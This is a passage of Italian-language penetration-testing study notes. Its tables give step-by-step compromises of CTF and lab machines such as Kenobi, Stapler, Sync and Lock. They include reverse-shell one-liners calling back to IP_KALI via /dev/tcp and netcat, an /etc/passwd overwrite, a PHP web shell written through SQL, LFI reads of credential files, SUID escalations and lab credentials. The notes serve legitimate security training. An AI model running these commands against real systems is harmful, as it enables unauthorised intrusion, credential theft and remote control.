| **Cracking**           | 1. `mysql -h IP_TARGET -u admin -p --skip-ssl`<br>2. `john --wordlists=/usr/share/wordlists/rockyou.txt hash`                                                      | Entriamo con le credenziali nella porta 3306 da remoto con la *1.* e facciamone il cracking con la *2.*                                                                                                                                                                                                                                                                                                                                                                                                                            |
| **RCE**                | 1. `searchsploit -m 45161`<br>2. `python2 45161.py http://IP_TARGET/openemr -u USER -p PASS -c 'bash -i >&  /dev/tcp/IP_KALI/80 0>&1'`                             | Una volta entrati in *OpenEMR 5.0.1* usiamo la vulnerabilit√† RCE presa con la *1.* e usiamola come in *2.* per una reverse shell                                                                                                                                                                                                                                                                                                                                                                                                   |






### ClamAV

| üß† **Azione**     | üíª **Comando / Metodo**                                                          | üìù **Output / Scopo**                                                                                                                                                                                                                                                     |
| ----------------- | -------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **UDP**           | 1. `nmap -sU -top-ports=100 IP_TARGET`<br>2. `snmpwalk -v2c -c public IP_TARGET` | Troviamo che √® aperta la porta `161` con servizio `SNMP`. Eseguiamo la *2.* per ottenere ulteriori informazioni tra cui `clamav-milter`.                                                                                                                                  |
| **ClamAV milter** | 1. `python3 exploit.py IP_TARGET`<br>2. `nc -nv IP_TARGET 31337`                 | `clamav-milter` √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/4761?source=post_page-----943bb3dd5a99---------------------------------------). Con la *1.* inseriamo la reverse shell sulla porta *31337* e con la *2.* ci connettiamo e finalmente siamo root |

### Bratarina

| üß† **Azione**       | üíª **Comando / Metodo**                                                                                                                                                                | üìù **Output / Scopo**                                                                                                                                                                                             |
| ------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **OpenSMTPD 2.0.0** | 1. `python3 47984.py IP_TARGET RPORT 'wget IP_KALI/shell -O /tmp/shell'`<br>2. `python3 47984.py IP_TARGET 'chmod +x /tmp/shell'`<br>3. `python3 47984.py IP_TARGET 'wget /tmp/shell'` | Tra i servizi esposti √® presente *Open SMPTD 2.0.0* che √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/47984). Proviamo con *1.* ,*2.* e *3.* per avviare una reverse shell ma non funziona            |
| **/etc/passwd**     | 1. `openssl passwd -1 -salt user password`<br>2. `python3 47984.py 'wget IP_KALI/passwd /etc/passwd'`<br>3. `ssh user@IP_TARGET`                                                       | Creiamo un nuovo utente e password nuova per l'utente `user` con la *1.* infine inseriamo la nuova utenza sulla macchina vittima con la *2.* ed entriamo tramite ssh con la *3.* proprio come in questa [guida]() |

### PC

| üß† **Azione** | üíª **Comando / Metodo**                                                                                                                | üìù **Output / Scopo**                                                                                                                                                                                                                                                               |
| ------------- | -------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Web shell** |                                                                                                                                        | Navigando sul troviamo che √® presente direttamente una web shell che ci fa essere gi√† dentro la macchina.                                                                                                                                                                           |
| **Chisel**    | 1. *KALI:* `./chisel server -p KALI_PORT --reverse`<br>2. *TARGET* `./chisel client IP_KALI:KALI_PORT KALI_PORT:127.0.0.1:TARGET_PORT` | Tra le porte aperte troviamo la 65432 e decidiamo di utilizzare chisel con la *1.* e *2.* per forwardarla sulla nostra macchina e scansionare il servizio con la *3.*. Purtroppo nulla di interessante                                                                              |
| **RPC**       | 1. `exec_command('id; chmod u+s /bin/bash')`<br>2. `python3 cve.py`<br>3. `/bin/bash -p`                                               | Notiamo che √® presente il file `/opt/rpc.py` e googlando il suo nome troviamo che √® vulnerabile a [Privileges Escalation](https://www.exploit-db.com/exploits/50983) . Cambiamo il `exec_command()` come in *1.* ed avviamolo con la *2.*.<br>Con la *3.* diventiamo di gruppo root |

### Sorcerer

| üß† **Azione** | üíª **Comando / Metodo**                                                                                                                                                                                                                                       | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Zip files** | 1. `scp -O authorized_keys max@IP_TARGET:/home/max/.ssh/authorized_keys`<br><br>============================<br><br>2. `no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_writeup.sh ssh-rsa ...."`<br>3. `ssh-rsa ....` | Tramite fuzzing directories trovo il percorso `/zipfiles` dove sono presenti diversi files `.zip`. Al loro interno √® presente una chiave SSH che quando provo ad usarla per l'accesso esegue il comando `command=/home/max/scp_wrapper.sh`. Questo √® un metodo di sicurezza presente in `authorized_keys` in remoto per evitare accessi indesiderati.<br><br>Per bypassare il metodo di sicurezza sovrascriviamo il file `authorized_keys` con la *1.*. Il file remoto diventa da *2.*=>*3.* |
| **SUID**      | 1. `/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p`                                                                                                                                                                                               | Tra i SUID file troviamo `start-stop-daemon` che √® secondo [GTFObins](https://gtfobins.github.io/gtfobins/start-stop-daemon/) √® vulnerabile                                                                                                                                                                                                                                                                                                                                                  |

### Kenobi

| üß† **Azione**     | üíª **Comando / Metodo**                                                                           | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                    |
| ----------------- | ------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **Samba**         | 1. `smbclient -L \\IP_TARGET -N`<br>2. `smbclient \\IP_TARGET\FOLDER`                             | Entriamo sulla porta samba senza uso di credenziali con la *2.* dove troviamo un file che ci fa capire che all'interno della macchina √® presente un utente di nome `kenobi`                                                                                                                                                                                              |
| **NFS**           | 1. `showmount -e IP_TARGET`<br>2 `mount -t nfs IP_TARGET:/var /mnt`                               | Tramite il comando *1.* scopriamo che possiamo montare la directory `/var` sulla nostra macchina. Usiamo la *2.* per montarla sulla nostra directory `/mnt`                                                                                                                                                                                                              |
| **ProFTPD 1.3.5** | 1. `nc IP_TARGET 21`<br>2. `SITE CPFR /home/kenobi/.ssh/id_rsa`<br>3. `SITE CPTO /var/tmp/id_rsa` | La porta ftp supporta la versione *ProFTPD 1.3.5* che √® vulnerabile secondo [ExploitDB](https://www.exploit-db.com/exploits/36742) : senza uso di autenticazione √® possibile copiare un file dalla macchina. Connettiamoci con la *1.*, utilizziamo la *2.* per copiare la chiave privata dell'utente `kenobi` e con la *3.* la copiamo nella cartella condivisa NFS<br> |
| **SSH**           | 1. `chmod 600 id_rsa`<br>2. `ssh -i id_rsa kenobi@IP_TARGET`                                      | Entriamo come `kenobi` dal servisio SSH                                                                                                                                                                                                                                                                                                                                  |
| **SUID**          | 1. `strings FILE_SUID`<br>2. `export PATH=/tmp:$PATH`                                             | Tra i file SUID ne troviamo uno sospetto `menu`. Quando lo avviamo appare una serie di opzioni da scegliere. Applicando il comando `strings` come in *1.* notiamo che utilizza il comando `curl`. Poich√© non utilizza path assoluto, modifichiamo con la *2.* la variabile globale `PATH`, creiamo un file `curl` inserendo una shell con ed avviamo il file SUID        |

### Boiler CTF

| üß† **Azione**   | üíª **Comando / Metodo**                                                                                       | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                 |
| --------------- | ------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Base64**      |                                                                                                               | Nel file `robots.txt` troviamo una stringa *base64* che decodificandola porta ad una stringa codificata in *MD5*. Decodificando anche l'ultima stringa otteniamo la parola `kidding`. Sembra un rabbit hole                                                                                                                                                                           |
| **FTP**         |                                                                                                               | Nella porta `ftp` troviamo una nota con dentro una stringa codificata in `ROT13`. Utilizziamo questo [decoder](https://rot13.com/) per decodificarla. Anche questo sembra un rabbit hole                                                                                                                                                                                              |
| **Sar2HTML**    | 1. *Navighiamo*`/joomla/_test/index.php?plot=ls`<br>2. *Navighiamo*`/joomla/_test/index.php?plot=cat log.txt` | Con il fuzzing directories troviamo la cartella `/joomla/_test/index.php` dove √® presente il servizio *Sar2HTML* che √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/47204). Secondo la CVE  il parametro `/index.php?plot=` √® vulnerabile a command injection.<br><br>Cona la *1.* e la *2.* otteniamo le credenziali `baster:superduperp@$$` con cui entriamo tramite SSH |
| **Credentials** |                                                                                                               | Nel file `/opt/backup.sh` troviamo le credenziali dell'utente `stoner`                                                                                                                                                                                                                                                                                                                |
| **SUID find**   | 1. `./find . -exec /bin/sh -p \; -quit`                                                                       | Tra i file SUID troviamo `find` che secondo [GTFObins](https://gtfobins.github.io/gtfobins/find/#suid) √® vulnerabile. Applichiamo la *1.* per diventare root                                                                                                                                                                                                                          |

- [writeup](https://medium.com/@persecure/tryhackme-boiler-ctf-3cf0b05e8e16)


### BitForge

| üß† **Azione**                   | üíª **Comando / Metodo**                                                                                                                         | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                     |
| ------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Git**                         | 1. `python3 git_dumper.py http://IP_TARGET/.git /home/kali/htb`<br>2. `git log`<br>3. `git show MD5_CODE`                                       | Con un fuzzing directories troviamo la cartella `.git`. Scarichiamo [gitdumper.py](https://github.com/arthaud/git-dumper) ed utilizziamo la *1.* per scaricare la cartella in locale.<br>Utilizziamo la *2.* per vedere le modifiche fatte e la *3.* per approfondire. Troviamo le credenziali del DB `BitForgeAdmin:B1tForG3S0ftw4r3S0lutions`                                                           |
| **MySQL**                       | 1. `mysql -h IP_TARGET -uUSER -pPASS`<br>2. `UPDATE planning_user SET password='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' WHERE user_id='ADM';` | Utilizziamo la *1.* per connetterci al DB in remoto. Una volta trovata la password della web application non siamo riusciti a craccarla, quindi utilizziamo la *2.* per cambiare la password in `admin`                                                                                                                                                                                                   |
| **Simple Online Planning 1.52** | 1. `python3 52082.py -u admin -p admin -t http://plan.bitforge.lab/www`                                                                         | Su un altro dominio troviamo il servizio *Simple Online Planning 1.52*, effettuiamo l'accesso con le credenziali precedentemente cambiate `admin:admin`.<br>Il servizio √® vulnerabile a [RCE](https://www.exploit-db.com/exploits/52082). Utilizziamo la *1.* per exploitare                                                                                                                              |
| **Pspy64s**                     | 1. `su jack`                                                                                                                                    | Avviando *pspy64s* sulla macchina target troviamo che viene eseguito l'accesso al DB con le credenziali `jack:j4cKF0rg3@445`                                                                                                                                                                                                                                                                              |
| **SUDO**                        | 1. `echo -e "import os;\nos.system('busybox nc IP_KALI LPORT -e bash')" > app.py`                                                               | l'utente `jack` ha il permesso come root di eseguire il comando `sudo /usr/bin/flask_password_changer`. Analizzando dall'interno il file notiamo che prima di avviarsi entra nella cartella `/opt/password_change_app` dove √® presente il file `app.py`; spesso `flask` lo utilizza per l'avvio.<br>Poich√© abbiamo i permessi di scrittura su `app.py` utilizziamo la *1.* per inserire una reverse shell |


- [writeup](https://medium.com/@abyssal_bloom/proving-grounds-bitforge-walkthrough-oscp-9aeb4fed4080)

### Stapler

| üß† **Azione**    | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **TLS**          | 1. `nikto --url http://IP_TARGET:12380`<br>2. `curl -k https://IP_TARGET:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=1&short=rnd&term=rnd&thumb=../wp-config.php`<br>3. `curl -k https://IP_TARGET:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=1&short=rnd&term=rnd&thumb=../../../../../../../etc/passwd`<br>4. `curl https://IP_TARGET:12380/blogblog/wp-content/uploads/IMMAGINE.jpg --output wp-config.php`<br>5. `curl https://IP_TARGET:12380/blogblog/wp-content/uploads/IMMAGINE.jpg --output passwd.txt` | Appicando *nikto* sulla porta `12380` troviamo il path `/blogblog` che √® accessibile solo tramite HTTPS. Il percorso `/blogblog/wp-content/plugins` √® accessibile senza autenticazione e troviamo il plugin `advanced video embedded 1.0` che √® vulnerabile a [LFI](https://www.exploit-db.com/exploits/39646).<br>Utilizziamo la *2.* e la *3.* per caricare come immagini in `/blogblog/wp-content/uploads` le risorse trovate sulla macchina target. Il servizio *Wordpress* non riesce a mostrare a schermo le immagini quindi usiamo la *4.* e *5.* |
| **Wordpress DB** | 1. `SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "/var/www/https/blogblog/wp-content/uploads/shell.php";`<br>2. ``                                                                                                                                                                                                                                                                                                                                                                                                                                | Connettiamoci al DB in remoto con le credenziali appena trovate e carichiamo una reverse shell con la *1.* e navighiamo `/blogblog/wp-content/uploads/shell.php?cmd=id` per avviarla                                                                                                                                                                                                                                                                                                                                                                     |
| **Bash hustory** |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   | Leggiamo il file `.bash_history` dell'utente `JKanode` e troveremo un accesso come utente peter con credenziali tramite SSH. Utilizzando la stessa password diventiamo utente peter che ha i permessi SUDO per diventare root                                                                                                                                                                                                                                                                                                                            |


- [writeup](https://portal.offsec.com/machine/stapler-15769/overview/details)

### Sync

| üß† **Azione** | üíª **Comando / Metodo**                                                                                         | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                     |
| ------------- | --------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Rsync 873** | 1. `rsync -av --list-only rsync://IP_TARGET`<br>2. `rsync -av rsync://IP_TARGET/httpd ./LOCAL_FOLDER`           | Con la scansione notiamo la porta `873` aperta con il servizio *rsync* che serve per sincronizzare i file tra le workstations. Seguendo la guida di [hacktricks](https://hacktricks.boitatech.com.br/pentesting/873-pentesting-rsync) usiamo la *1.* per listare i file presenti e la *2.* per scaricarli in locale.<br><br>NB: il servizio *rsync* potrebbe richiedere delle credenziali |
| **sqlite**    | 1. `sqlite3 site.db`<br>2. `.tables`<br>3. `select * from users`                                                | All'interno delle cartelle scaricate troviamo il file `site.db` contenente records. Usiamo la *1.*, *2.* e *3.* ed otteniamo delle credenziali hashate                                                                                                                                                                                                                                    |
| **Cracking**  | 1. ![[Pasted image 20250715210343.png]]<br>2. `hashcat -m 20 hash /usr/share/wodlists/rockyou.txt`              | Controllando il file scaricato `index.php` come in *1.* notiamo che utilizza un parametro `$secure=` che √® probabilmente il salt ed un parametro `$hash=` che ci fa capire come hasha la password per l'accesso.<br><br>Creiamo un file con credenziali `PASSWORD:SALT` e cracchiamolo con la *2.* ed otteniamo le credenziali dell'utente `triss:gerarld`                                |
| **FTP**       | 1. `ssh-keygen -f triss`<br>2. `mkdir .ssh`<br>3. `put authorized_keys`                                         | Con le nuove credenziali possiamo entrare nel servizio FTP che ci riporta direttamente sulla cartella principale dell'utente. Utilizziamo la *1.* per generare una chiave SSH e con la *2.* e la *3.* la inseriamo in modo da poter effettuare l'accesso con SSH                                                                                                                          |
| **Shadow**    | 1. `unshadow passwd shadow > hash`<br>2. `john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hash` | Scarico sulla macchina locale i file `.zip` presenti sul target e trovo un backup del file shadow. Utilizziamo la *1.* e la *2.* per decriptare e troviamo le credenziali `sakura:sa`                                                                                                                                                                                                     |
| **Pspy**      | 1. `echo "bash -i >& /dev/tcp/IP_KALI/80 0>&1" >> backup.sh`                                                    | Avviando sulla macchina *pspy64s* notiamo che l'utente `sakura` ha i permessi di scrittura sul file `backup.sh` eseguito dall'utente root                                                                                                                                                                                                                                                 |


- [writeup](https://inventyourshit.com/vulnlab-sync/#port-873-rsync)


### Forgotten

| üß† **Azione**                                | üíª **Comando / Metodo**                                                                                                                                                                                                                                                                                                                                     | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                                                                                            |
| -------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **LimeSurvey Installation**                  | 1. `apt install mariadb-server`<br>2. `systemctl start mysql`<br>3. `CREATE DATABASE limesurvey;`<br>4. `CREATE USER 'lime_user'@'%' IDENTIFIED BY 'lime_user';`<br>5. `GRANT ALL PRIVILEGES ON limesurvey.* TO 'lime_user'@'%' WITH GRANT OPTION;`<br>6. `SHOW GRANTS for 'lime_user'@'%';`<br>7. `FLUSH PRIVILEGES;`<br>8. `sudo systemctl restart mysql` | Dopo un fuzzing directories troviamo la cartella `/survey` che ci mostra l'installazione del servizio *LimeSurvey*.<br>Nella fase `installer/database` possiamo configurare il database. Per inserire exploitarlo configuriamo con *1.* a *8.* un nostro database MySQL in locale con proprietario `lime_survey:lime_survey`                                                                                                                     |
| **Configuration admin user**                 | 1. ![[Pasted image 20250719135342.png]]<br>2. ![[Pasted image 20250719135435.png]]                                                                                                                                                                                                                                                                          | Inseriamo i dati come nella *1.* per connetterlo al nostro DB in locale. Popoliamo il DB con la *2.* ed effettuiamo il login                                                                                                                                                                                                                                                                                                                     |
| **RCE**                                      | 1. `git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git`<br>2. `zip Y1LD1R1M.zip config.xml php-rev.php`<br>3. `nc -lvnp 80`                                                                                                                                                                                                                      | Scarichiamo l'exploit con la *1.*. Cambiamo l'IP della reverse shell nel nostro, inseriamo nel file config.xml il tag `<version>6.3.7</version>` in `<compatibility>` e zippiamo con la *2.*. Infine andiamo in SETTINGS=>PLUGINS=>UPLOAD & INSTALL e carichiamo il file `.zip` appena creato. Apriamo una porta con la *3.* in ascolto e enstalliamo il plugin. Navighiamo la pagina `/survey/upload/plugins/Y1LD1R1M/php-rev.php` per avviarla |
| **Container**                                |                                                                                                                                                                                                                                                                                                                                                             | Visitando la cartella `/` troviamo `.dockerenv`, questo significa che ci troviamo all'interno di un container. Avviando `linpeas.sh` notiamo che la variabile globale `LIMESURVEY_PASS=` ci riporta la password utilizzata quindi possiamo usarla per connetterci tramite SSH con l'account `lime_survey`. Adesso siamo nell'ambiente host                                                                                                       |
| **Privesc shared folder container and host** | 1.`mount / df -h`<br>2. `cp /bin/bash .`<br>3. `chmod u+s /bin/bash`<br>4. `/bash -p`                                                                                                                                                                                                                                                                       | Con la *1.* notiamo che la cartella `/var/www/html/survey` √® scrivibile dal root del container ed √® condivisa sia tra sistema host che dal container. Poich√© l'utente container ha permessi root copiamo il file `/bin/bash` con la *2.* nella cartella in modalit√† SUID con la *3.*. Infine avviamolo dall'utente host cos√¨ da diventare root                                                                                                   |

- [writeup](https://dan-feliciano.com/2024/06/05/forgotten/)

### Lock

| üß† **Azione**   | üíª **Comando / Metodo**                                                                                                                                      | üìù **Output / Scopo**                                                                                                                                                                                                                                                                                                                                                       |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Gitea 1.21**  | 1. `python3 script.py http://IP_TARGET:3000`<br>2. `git clone "TOKEN@IP_TARGET/ellen.freeman/website"`                                                       | Con la scansione notiamo la porta aperta `3000` su cui √® presente il servizio *Gitea 1.21*. Andando sulla sezione EXPLORE=>COMMITS notiamo uno script contenente il TOKEN di autenticazione dell'utente `ellen.freeman` e che controlla cosa √® presente nel repository.<br>Scarichiamo lo script ed avviamolo con la *1.*, poi con la *2.* cloniamo in locale il repository |
| **Web shell**   | 1. ![[Pasted image 20250720181825.png]]<br>2. `git add shell.aspx`<br>3. `git commit -m "shell"`<br>4. `git push`<br>5. ![[Pasted image 20250720182129.png]] | Leggendo il file `readme.md` *1.* notiamo che possiamo caricare file. Allora scarichiamo una [web shell aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx) e carichiamola con la *2.*, *3.* e *4.*. Navigando `http://IP_KALI/shell.aspx` abbiamo accesso alla web shell                                                                     |
| **mRemoteNG**   | 1. `python3 decrypt.py config.xml`<br>2. `xfreerdp3 /u:gale.dakarios /p:'PASS' /v:10.10.101.147 /cert:ignore`<br>                                            | Sulla cartella `C:\Users\elle.freeman\Desktop` troviamo il file `config.xml` contenente le credenzali del servizio *mRemoteNG*. Scarichiamo il [decrypter](https://github.com/gquere/mRemoteNG_password_decrypt/blob/master/mremoteng_decrypt.py) ed usiamolo con la *1.* ed effetuiamo l'accesso tramite RDP con la *2.*                                                   |
| **PDF24 11.15** | SEGUIRE IL WRITEUP                                                                                                                                           | Notiamo il programma *PDF24 11.15* che √® vulnerabile a [privileges escalation](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/)                                                                                                                                                        |

- [writeup](https://arz101.medium.com/vulnlab-lock-2cf8ae6ebe29)

### Precious

| üß† **Azione**         | üíª **Comando / Metodo**                                                                                                                                       | üìù **Output / Scopo**                                                                                                                                                                                                                                                                  |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **PDF Convertion**    | 1. ![[Pasted image 20250816215244.png]]<br>2. `curl -X POST --data "url=http%3A%2F%2FIP_KALI" http://IP_TARGET --output index.pdf`<br>3. `exiftool index.pdf` | Sulla porta abbiamo un servizio che converte converte pagine web in remoto in pdf. Creiamo una pagina web come test come nella *1.* e carichiamola sul servizio con la *2.*.<br>Scansionando l'output con la *3.* scopriamo che utilizza *pdfkit v0.8.6* per la creazione del file pdf |
| **pdfkit v0.8.6**     | 1. `python3 51293.py -s IP_KALI LPORT -w http://IP_TARGET -p url`                                                                                             | Il servizio *pdfkit v0.8.6* √® vulnerabile a [CVE-2022‚Äì25765](https://www.exploit-db.com/exploits/51293). Usiamo la *1.* per avviare una reverse shell                                                                                                                                  |
| **Credential reused** |                                                                                                                                                               | Nel file `/home/ruby/config` troviamo le credenziali `henry:PASS` che usiamo per entrare tramite SSH                                                                                                                                                                                   |
| **SUDO**              | 1. ![[Pasted image 20250816220425.png]]<br>2. ![[Pasted image 20250816220506.png]]                                                                            | L'utente attuale ha i permessi SUDO per eseguire il file *1.* che dipende dal file `dependencies.yml` che scopriamo essere vulnerabile a *Command Injection*. Modifichiamo il file come nella *2.* per diventare root                                                                  |
